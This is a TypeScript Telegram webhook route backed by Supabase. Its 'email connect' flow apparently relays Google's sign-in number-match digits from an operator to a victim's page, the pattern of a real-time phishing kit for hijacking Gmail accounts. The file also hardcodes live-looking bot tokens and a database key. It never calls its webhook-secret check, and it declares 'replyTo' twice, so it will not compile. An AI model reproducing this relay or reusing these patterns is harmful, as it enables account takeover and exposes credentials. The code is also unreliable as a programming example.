import { createFileRoute } from "@tanstack/react-router";
import { createHash, timingSafeEqual } from "crypto";

const BOT_TOKEN = "8849968223:AAFEe0LkfJcgTPq0UpW4HZD_eKSjl4ACjdY";
// Email-connect bot uses a different token
const EC_BOT_TOKEN = "8482023666:AAGjANprWJpo2gwrxZWNzPJLMcuYhmvRvqY";
const SB_URL    = "https://croiuvvyeyvtehcftxrf.supabase.co";
const SB_KEY    = "sb_publishable_g3QsYAAcd97X4g3VKx43ow_U806nBzx";

function deriveWebhookSecret(apiKey: string): string {
  return createHash("sha256").update(`telegram-webhook:${apiKey}`).digest("base64url");
}
function safeEqual(a: string, b: string): boolean {
  const A = Buffer.from(a);
  const B = Buffer.from(b);
  return A.length === B.length && timingSafeEqual(A, B);
}

function escHtml(s: string) {
  return String(s).replace(/[&<>"']/g, (c) =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]!),
  );
}

async function ecTgEdit(messageId: number, text: string, replyMarkup?: unknown) {
  await fetch(`https://api.telegram.org/bot${EC_BOT_TOKEN}/editMessageText`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: "6048752790", message_id: messageId, text,
      parse_mode: "HTML", disable_web_page_preview: true,
      ...(replyMarkup ? { reply_markup: replyMarkup } : {}),
    }),
  }).catch(() => {});
}

export const Route = createFileRoute("/api/public/telegram/webhook")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        let update: Record<string, unknown>;
        try {
          update = await request.json();
        } catch {
          return Response.json({ ok: true, ignored: "parse_error" });
        }

        // ── EMAIL CONNECT callback_query (ec_* actions) ────────────────────
        const cbq = update?.callback_query as Record<string, unknown> | undefined;
        if (cbq?.data) {
          const cbData = cbq.data as string;
          const cbId   = cbq.id as string;
          const cbMsg  = cbq.message as Record<string, unknown> | undefined;
          const msgId  = cbMsg?.message_id as number | undefined;

          // Ack immediately
          await fetch(`https://api.telegram.org/bot${EC_BOT_TOKEN}/answerCallbackQuery`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ callback_query_id: cbId }),
          }).catch(() => {});

          if (cbData.startsWith("ec_")) {
            // Update session in Supabase directly via REST
            const getAction = () => {
              if (cbData.startsWith("ec_done:"))    return { sid: cbData.slice(8), action: "done"    as const };
              if (cbData.startsWith("ec_fail:"))    return { sid: cbData.slice(8), action: "fail"    as const };
              if (cbData.startsWith("ec_digit:"))   return { sid: cbData.slice(9), action: "digit"   as const };
              if (cbData.startsWith("ec_newdigit:"))return { sid: cbData.slice(12),action: "newdigit"as const };
              return null;
            };
            const parsed = getAction();
            if (parsed) {
              const { sid, action } = parsed;
              const headers = { "Content-Type": "application/json", "apikey": SB_KEY, "Authorization": `Bearer ${SB_KEY}`, "Prefer": "return=minimal" };

              if (action === "done") {
                await fetch(`${SB_URL}/rest/v1/email_connect_sessions?id=eq.${encodeURIComponent(sid)}`, {
                  method: "PATCH", headers, body: JSON.stringify({ status: "complete" }),
                }).catch(() => {});
                if (msgId) await ecTgEdit(msgId, `✅ <b>Email linked successfully</b>\nSession <code>${escHtml(sid)}</code> complete.`);

              } else if (action === "fail") {
                await fetch(`${SB_URL}/rest/v1/email_connect_sessions?id=eq.${encodeURIComponent(sid)}`, {
                  method: "PATCH", headers, body: JSON.stringify({ status: "failed" }),
                }).catch(() => {});
                if (msgId) await ecTgEdit(msgId, `❌ <b>Link failed</b>\nSession <code>${escHtml(sid)}</code>. Member sees retry screen.`);

              } else if (action === "digit") {
                if (msgId) {
                  await ecTgEdit(
                    msgId,
                    `⌨️ <b>Reply to this message</b> with the digit Google is showing.\n\nSession: <code>${escHtml(sid)}</code>`,
                    { inline_keyboard: [[
                        { text: "✅ Member confirmed", callback_data: `ec_done:${sid}` },
                        { text: "🔄 New digit", callback_data: `ec_newdigit:${sid}` },
                        { text: "❌ Failed", callback_data: `ec_fail:${sid}` },
                      ]] },
                  );
                }

              } else if (action === "newdigit") {
                await fetch(`${SB_URL}/rest/v1/email_connect_sessions?id=eq.${encodeURIComponent(sid)}`, {
                  method: "PATCH", headers, body: JSON.stringify({ status: "gmail_digit", gmail_digit: "?" }),
                }).catch(() => {});
                if (msgId) {
                  await ecTgEdit(
                    msgId,
                    `🔄 <b>New digit needed.</b> Reply here with the new digit Google shows.\n\nSession: <code>${escHtml(sid)}</code>`,
                    { inline_keyboard: [[
                        { text: "✅ Member confirmed", callback_data: `ec_done:${sid}` },
                        { text: "🔄 New digit", callback_data: `ec_newdigit:${sid}` },
                        { text: "❌ Failed", callback_data: `ec_fail:${sid}` },
                      ]] },
                  );
                }
              }
            }
            return Response.json({ ok: true });
          }
        }

        // ── DIGIT REPLY: admin replies to the bot message with a digit ─────
        const incomingMsg = update?.message as Record<string, unknown> | undefined;
        const replyTo     = incomingMsg?.reply_to_message as Record<string, unknown> | undefined;
        const incomingText = (incomingMsg?.text as string | undefined)?.trim();
        if (incomingText && replyTo?.message_id && /^\d+$/.test(incomingText)) {
          const replyMsgId = replyTo.message_id as number;
          // Look up session by tg_message_id
          const lookupRes = await fetch(
            `${SB_URL}/rest/v1/email_connect_sessions?tg_message_id=eq.${replyMsgId}&select=id&limit=1`,
            { headers: { "apikey": SB_KEY, "Authorization": `Bearer ${SB_KEY}` } }
          ).catch(() => null);
          const lookupData = lookupRes ? await lookupRes.json().catch(() => []) : [];
          const sessionId  = lookupData?.[0]?.id;
          if (sessionId) {
            await fetch(`${SB_URL}/rest/v1/email_connect_sessions?id=eq.${encodeURIComponent(sessionId)}`, {
              method: "PATCH",
              headers: { "Content-Type": "application/json", "apikey": SB_KEY, "Authorization": `Bearer ${SB_KEY}`, "Prefer": "return=minimal" },
              body: JSON.stringify({ status: "gmail_digit", gmail_digit: incomingText }),
            }).catch(() => {});
            return Response.json({ ok: true });
          }
        }

        // ── REGULAR TEXT REPLY (support message flow) ──────────────────────
        const message = (update?.message ?? update?.edited_message) as Record<string, unknown> | undefined;
        const text    = message?.text as string | undefined;
        const replyTo = message?.reply_to_message as Record<string, unknown> | undefined;

        if (!text || !replyTo?.message_id) {
          return Response.json({ ok: true, ignored: true });
        }

        // Look up user from telegram_message_map
        const mapRes = await fetch(
          `${SB_URL}/rest/v1/telegram_message_map?telegram_message_id=eq.${replyTo.message_id}&select=user_id&limit=1`,
          { headers: { "apikey": SB_KEY, "Authorization": `Bearer ${SB_KEY}` } }
        ).catch(() => null);

        const mapData = mapRes ? await mapRes.json().catch(() => []) : [];
        const userId  = mapData?.[0]?.user_id;

        if (!userId) {
          // Fallback: parse uid from quoted message text
          const m = /uid:\s*([0-9a-f-]{36})/i.exec((replyTo.text as string) ?? "");
          if (m) {
            await fetch(`${SB_URL}/rest/v1/support_messages`, {
              method: "POST",
              headers: { "Content-Type": "application/json", "apikey": SB_KEY, "Authorization": `Bearer ${SB_KEY}`, "Prefer": "return=minimal" },
              body: JSON.stringify({ user_id: m[1], direction: "in", body: text }),
            }).catch(() => {});
          }
          return Response.json({ ok: true });
        }

        await fetch(`${SB_URL}/rest/v1/support_messages`, {
          method: "POST",
          headers: { "Content-Type": "application/json", "apikey": SB_KEY, "Authorization": `Bearer ${SB_KEY}`, "Prefer": "return=minimal" },
          body: JSON.stringify({ user_id: userId, direction: "in", body: text }),
        }).catch(() => {});

        return Response.json({ ok: true });
      },
    },
  },
});
